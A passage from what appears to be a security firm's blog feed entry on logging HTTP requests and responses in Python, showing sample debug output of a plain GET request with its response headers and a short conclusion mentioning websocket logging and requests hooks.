+X-Amz-Cf-Id: 5WSuiFqiDF_me87HjfB02e4XSkp8ZMWTauHSvVQawC9Hg51bjH9K-Q<span class="o">==</span>
+
+&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
+&lt;body <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"white"</span><span class="o">&gt;</span>
+&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;CloudFront&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+2022-06-16 00:31:44,047 DEBUG urllib3.connectionpool Starting new HTTPS connection <span class="o">(</span>1<span class="o">)</span>: secariolabs.com:443
+2022-06-16 00:31:44,132 DEBUG urllib3.connectionpool https://secariolabs.com:443 <span class="s2">"GET / HTTP/1.1"</span> 200 16347
+2022-06-16 00:31:44,133 DEBUG httplogger HTTP roundtrip
+<span class="nt">----------------</span> request <span class="nt">----------------</span>
+GET https://secariolabs.com/
+User-Agent: python-requests/2.27.0
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Connection: keep-alive
+
+None
+<span class="nt">----------------</span> response <span class="nt">----------------</span>
+200 OK https://secariolabs.com/
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+Content-Length: 16347
+Connection: keep-alive
+Date: Wed, 15 Jun 2022 23:31:46 GMT
+Server: Apache
+Expires: Thu, 16 Jun 2022 00:31:46 GMT
+Pragma: public
+Cache-Control: max-age<span class="o">=</span>3600, public, max-age<span class="o">=</span>0, no-cache, s-maxage<span class="o">=</span>10
+X-Frame-Options: SAMEORIGIN, SAMEORIGIN
+Strict-Transport-Security: max-age<span class="o">=</span>63072000
+X-Mod-Pagespeed: 1.13.35.2-0
+Content-Encoding: <span class="nb">gzip
+</span>X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer-when-downgrade
+X-Permitted-Cross-Domain-Policies: none
+Feature-Policy: camera <span class="s1">'none'</span><span class="p">;</span> fullscreen <span class="s1">'self'</span><span class="p">;</span> geolocation <span class="k">*</span><span class="p">;</span> microphone <span class="s1">'none'</span>
+Permissions-Policy: <span class="nv">geolocation</span><span class="o">=(</span><span class="k">*</span><span class="o">)</span>, <span class="nv">microphone</span><span class="o">=()</span>, <span class="nv">camera</span><span class="o">=()</span>, <span class="nv">fullscreen</span><span class="o">=(</span>self<span class="o">)</span>
+Vary: Accept-Encoding
+X-XSS-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+X-Cache: Miss from cloudfront
+Via: 1.1 44a651f8e3a1f38a5a977c4f0c4d45a0.cloudfront.net <span class="o">(</span>CloudFront<span class="o">)</span>
+X-Amz-Cf-Pop: LHR52-C1
+X-Amz-Cf-Id: 7eReUC-yuJugzYBRCVoKauftHc53DvdsKi1hx1pU5M9TjJc_Ml6n9Q<span class="o">==</span>
+
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+<span class="o">[</span>...snip...]
+
+</code></pre></div></div>
+
+<p>This concludes our quick look into HTTP logging using Python.</p>
+
+<p>Future research could focus on websocket logging (something we are starting to see more of), as well as a way to add a default hook to <code class="language-plaintext highlighter-rouge">requests</code>, rather than having to set one per session and then having to manually track that all session objects have this hook.</p>
+
+<p>The article was written by <a href="https://twitter.com/saldat0" title="@saldat0">@saldat0</a></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Quite often, during our red team engagements, we find ourselves in a situation where we need to carry out web research &amp; exploitation over several chained proxies. To that extended, to be able to do any reasonable web testing we need to be able to see the requests we send to the server and the corresponding replies. Tools like BurpSuite and mitmproxy can be helpful, however, by themselves, they introduce a lot of additional complexity, traffic overhead, and they are not very easy to configure in terms of what and how it is being logged. Sometimes you just want to have control over the data and do something with it. Because of that, our weapon of choice for most of these edge cases is Python with ProxyChains. The reason we like Python is because it is easy to enable HTTP request/response logging with the minimal amount of code.]]></summary></entry></feed>
